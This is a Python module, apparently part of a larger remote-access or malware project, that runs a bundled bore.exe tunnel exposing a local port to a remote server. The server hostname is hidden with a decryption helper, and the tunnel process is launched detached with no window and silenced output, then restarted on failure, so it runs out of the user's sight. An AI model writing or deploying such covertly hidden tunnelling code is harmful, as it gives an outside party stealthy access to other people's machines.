import os
import subprocess
import threading
import time
import socket
from typing import Optional
from core.obfuscation import decrypt_string
from core.config import ConfigManager
from core.error_logger import log_error, log_info

class BoreTunneler:
    """H-12: Network Tunneling & Connectivity Resilience"""
    
    def __init__(self, local_port: int = 8080):
        self.local_port = local_port
        # Encrypted remote server URL
        # "tunnel.ptrkxlord.me" -> "YlcMGTdxOAQuEhgYWmUCUUc=" (re-using existing style)
        self.remote_server = decrypt_string("YlcMGTdxOAQuEhgYWmUCUUc=") 
        self.remote_port = 7835
        self.process: Optional[subprocess.Popen] = None
        self.running = False
        self.lock = threading.Lock()
        self.retry_count = 0
        self.max_retries = 5

    def _is_port_available(self, port: int) -> bool:
        """Checks if a local port is available for binding"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.bind(('127.0.0.1', port))
            sock.close()
            return True
        except:
            return False

    def start_tunnel(self):
        """Starts bore.exe local tunnel in a background thread with backoff"""
        bore_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "bore.exe")
        if not os.path.exists(bore_path):
            log_error(f"Bore executable not found at {bore_path}", "Tunneler")
            return False
            
        def run():
            while self.running and self.retry_count < self.max_retries:
                try:
                    # Check port availability
                    if not self._is_port_available(self.local_port):
                        log_error(f"Port {self.local_port} in use, waiting...", "Tunneler")
                        time.sleep(10)
                        continue
                        
                    # bore local <LOCAL_PORT> --to <REMOTE_SERVER>
                    cmd = [bore_path, "local", str(self.local_port), "--to", self.remote_server]
                    
                    with self.lock:
                        # CREATE_NO_WINDOW (0x08000000) | DETACHED_PROCESS (0x00000008)
                        self.process = subprocess.Popen(
                            cmd, 
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            creationflags=0x08000000 | 0x00000008
                        )
                    
                    self.retry_count = 0 # Reset on success
                    log_info(f"Tunnel process started: {self.process.pid}", "Tunneler")
                    self.process.wait()
                    
                except Exception as e:
                    log_error(f"Tunnel error: {e}", "Tunneler")
                    self.retry_count += 1
                    time.sleep(2 ** self.retry_count) # Exponential backoff
                    
        self.running = True
        threading.Thread(target=run, daemon=True).start()
        
        # Verify startup
        time.sleep(1.5)
        return self.is_active()

    def stop_tunnel(self):
        """Graceful termination of the tunnel process"""
        with self.lock:
            self.running = False
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=5)
                except:
                    try: self.process.kill()
                    except: pass
                self.process = None
            self.retry_count = 0
            log_info("Tunnel stopped", "Tunneler")

    def is_active(self) -> bool:
        """Checks if the tunnel process is currently running"""
        with self.lock:
            return self.running and self.process and self.process.poll() is None
